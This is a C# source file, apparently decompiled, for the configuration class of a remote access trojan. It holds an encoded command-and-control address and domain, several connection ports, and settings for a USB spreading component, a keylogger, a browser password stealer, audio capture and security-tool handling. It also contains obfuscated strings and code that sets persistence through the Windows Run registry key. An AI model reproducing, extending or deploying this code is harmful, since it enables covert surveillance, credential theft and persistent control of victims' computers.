using System;
using Microsoft.Win32;

namespace camsars;

internal static class romwckoCONF
{
	public static string romwckodefaultP = "215.125.254.210|wicmx".Split(new char[1] { '|' })[0];

	public static string romwckopc_id = "rams|wicmx".Split(new char[1] { '|' })[0];

	public static byte[] romwckovpsips = new byte[30]
	{
		53, 46, 49, 56, 57, 46, 49, 55, 55, 46,
		49, 55, 53, 63, 109, 115, 100, 110, 115, 101,
		114, 118, 101, 100, 116, 97, 46, 99, 111, 109
	};

	public static int romwckoport = 9424;

	public static string romwckopaslogs = "susaec|wicmx".Split(new char[1] { '|' })[0];

	public static string romwckoappPath = "\\Mrsia\\|wicmx".Split(new char[1] { '|' })[0];

	public static int port = 9424;

	public static int aport = 10418;

	public static int bport = 11526;

	public static int cport = 12665;

	public static int dport = 15528;

	public static string romwckoflshPath = "\\Wrceu\\|wicmx".Split(new char[1] { '|' })[0];

	public static string romwckousbApp = "oiarec|wicmx".Split(new char[1] { '|' })[0];

	public static string romwckousbwrm = "aism|wicmx".Split(new char[1] { '|' })[0];

	public static string romwckopssApp = "susaec|wicmx".Split(new char[1] { '|' })[0];

	public static string romwckoaudioDLL = "NAudio.dll|wicmx".Split(new char[1] { '|' })[0];

	private static string romwcko = "GRFED3R|wicmxYTG2R3F";

	public static string romwckothiPath = "\\Sisuc\\|wicmx".Split(new char[1] { '|' })[0];

	public static string romwckochromDLL = "System.Data.SQLite.dll|wicmx".Split(new char[1] { '|' })[0];

	public static string romwckomozeDLL = "mozsqlite3.dll|wicmx".Split(new char[1] { '|' })[0];

	public static string romwckosecApp = "nrieac|wicmx".Split(new char[1] { '|' })[0];

	public static string romwckopasPath = "\\Aucis\\|wicmx".Split(new char[1] { '|' })[0];

	public static string romwckoremvUser = "aimnuc|wicmx".Split(new char[1] { '|' })[0];

	public static string romwckokeePath = "\\Icasr\\|wicmx".Split(new char[1] { '|' })[0];

	public static string romwckokiyApp = "wrices|wicmx".Split(new char[1] { '|' })[0];

	public static string romwckofilesLogs = "mdis".Split(new char[1] { '|' })[0];

	public static string romwckomainApp = "camsars|wicmx".Split(new char[1] { '|' })[0];

	public static string romwckokeloogs = "wrices|wicmx".Split(new char[1] { '|' })[0];

	public static string romwckoclientNum = "";

	public static bool usb
	{
		set
		{
			romwckoset_value("iub!romwcko".Split(new char[1] { '!' })[0], romwckousbApp + "|" + romwckoflshPath, value);
			romwckoget_usb();
		}
	}

	public static bool securty
	{
		set
		{
			romwckoset_value("sew!romwcko".Split(new char[1] { '!' })[0], romwckosecApp + "|" + romwckothiPath, value);
			romwckoget_securty();
		}
	}

	public static bool pass
	{
		set
		{
			romwckoset_value("was!romwcko".Split(new char[1] { '!' })[0], romwckopssApp + "|" + romwckopasPath, value);
			romwckoget_pass();
		}
	}

	public static string romwcko_osname()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		return version.Major + ">" + version.Minor;
	}

	public static string romwckousbPath()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + romwckoflshPath;
	}

	public static string romwckokiPath()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + romwckokeePath;
	}

	public static void romwckoget_pass()
	{
		string text = romwckoget_value("was!romwcko".Split(new char[1] { '!' })[0]);
		if (text != null)
		{
			string[] array = text.Split(new char[1] { '|' });
			if (array.Length == 2)
			{
				romwckopssApp = array[0];
				romwckopasPath = array[1];
			}
		}
	}

	public static string romwckoget_mpath()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + romwckoappPath;
	}

	public static void romwckoset_kilog(bool update = false)
	{
		romwckoget_kilog();
	}

	public static void romwckoget_securty()
	{
		string text = romwckoget_value("sew!romwcko".Split(new char[1] { '!' })[0]);
		if (text != null)
		{
			string[] array = text.Split(new char[1] { '|' });
			if (array.Length == 2)
			{
				romwckosecApp = array[0];
				romwckothiPath = array[1];
			}
		}
	}

	public static void romwckoset_setting(bool update = true)
	{
		romwckomachineName();
		romwckoset_App(update);
	}

	public static string romwckoget_ppath()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + romwckopasPath;
	}

	public static void romwckoset_App(bool update = false)
	{
		romwckoset_value("mun!romwcko".Split(new char[1] { '!' })[0], romwckomainApp + "|" + romwckoappPath, update);
		romwckoget_App();
	}

	public static void romwckoget_kilog()
	{
		string text = romwckoget_value("kun!romwcko".Split(new char[1] { '!' })[0]);
		if (text != null)
		{
			string[] array = text.Split(new char[1] { '|' });
			if (array.Length == 2)
			{
				romwckokiyApp = array[0];
				romwckokeloogs = romwckokiyApp;
				romwckokeePath = array[1];
			}
		}
	}

	public static void romwckoset_value(string name, string value, bool update = false)
	{
		string text = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion|wicmx";
		try
		{
			if (romwckoget_value(name) == null || update)
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text.Split(new char[1] { '|' })[0], writable: true);
				registryKey.SetValue(romwckopc_id + name, value);
			}
		}
		catch
		{
		}
	}

	public static string romwckosecPath()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + romwckothiPath;
	}

	public static void romwckoget_App()
	{
		string text = romwckoget_value("mun!romwcko".Split(new char[1] { '!' })[0]);
		if (text != null)
		{
			string[] array = text.Split(new char[1] { '|' });
			if (array.Length == 2)
			{
				romwckomainApp = array[0];
				romwckoappPath = array[1];
			}
		}
	}

	public static string romwckoget_value(string name)
	{
		string text = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion|wicmx";
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text.Split(new char[1] { '|' })[0], writable: true);
			if (registryKey.GetValue(romwckopc_id + name) != null)
			{
				return registryKey.GetValue(romwckopc_id + name)!.ToString()!.Trim();
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	public static void romwckoset_run(string app, string path)
	{
		try
		{
			string text = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|wicmx";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text.Split(new char[1] { '|' })[0], writable: true);
			string text2 = romwckopc_id;
			object value = registryKey.GetValue(text2 + app);
			if (value == null)
			{
				if (romwcko == "4YTR3FD|wicmxTRE5E3D1X")
				{
					romwcko = "TRE5E3D1X|wicmxET2RE2E1";
				}
				registryKey.SetValue(text2 + app, path);
			}
			else if (value.ToString() != path)
			{
				registryKey.SetValue(text2 + app, path);
			}
		}
		catch
		{
		}
	}

	public static void romwckomachineSetup(string tclientNum)
	{
		string text = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion|wicmx";
		romwckoclientNum = tclientNum;
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text.Split(new char[1] { '|' })[0], writable: true);
			registryKey.SetValue(romwckopc_id + "var!romwcko".Split(new char[1] { '!' })[0], romwckoclientNum);
		}
		catch
		{
		}
	}

	public static void romwckomachineName()
	{
		string text = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion|wicmx";
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text.Split(new char[1] { '|' })[0], writable: true);
			if (registryKey.GetValue(romwckopc_id + "var!romwcko".Split(new char[1] { '!' })[0]) != null)
			{
				romwckoclientNum = registryKey.GetValue(romwckopc_id + "var!romwcko".Split(new char[1] { '!' })[0])!.ToString()!.Trim();
			}
		}
		catch
		{
		}
	}

	public static void romwckoget_usb()
	{
		string text = romwckoget_value("iub!romwcko".Split(new char[1] { '!' })[0]);
		if (text != null)
		{
			string[] array = text.Split(new char[1] { '|' });
			if (array.Length == 2)
			{
				romwckousbApp = array[0];
				romwckoflshPath = array[1];
			}
		}
	}
}
